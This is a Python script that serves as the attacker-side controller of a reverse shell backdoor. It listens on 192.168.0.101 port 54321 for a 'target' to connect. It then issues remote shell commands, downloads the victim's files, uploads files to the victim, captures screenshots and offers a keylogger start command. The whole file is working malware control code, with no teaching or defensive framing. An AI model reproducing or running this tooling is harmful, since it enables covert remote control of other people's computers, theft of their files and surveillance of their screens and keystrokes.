#!/usr/bin/python
import socket
import json
import base64 
import subprocess
import time 
import requests
import ctypes
import sys
import threading


count = 1

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue	
		

def execute_remotely(command):
	reliable_send(command)

	if command == "exit":
		s.close()
		exit()
	
def shell():
	global count
	while True:
		
		command = raw_input("* Shell#~%s:" % str(ip))
		reliable_send(command)
		if command == "exit":
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:12] == "keylog_start":
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				result = reliable_recv()
				file.write(base64.b64decode(result))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					reliable_send(base64.b64encode(fin.read()))
			except:
				failed = "Upload Failed"
				reliable_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			with open("screenshot%d" % count, "wb") as screen:
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == "[!!]":
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count += 1
		else:
			try:
				result = reliable_recv()
				print(result)
			except:
				reliable_send("[!!]Error During Command Execution!.")
					
		
	
		
def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("192.168.0.101", 54321))
	s.listen(5)
	print("Listening For Incoming Connections[+]")
	target, ip = s.accept()
	print("Target Connected!")
server()
shell()
s.close()
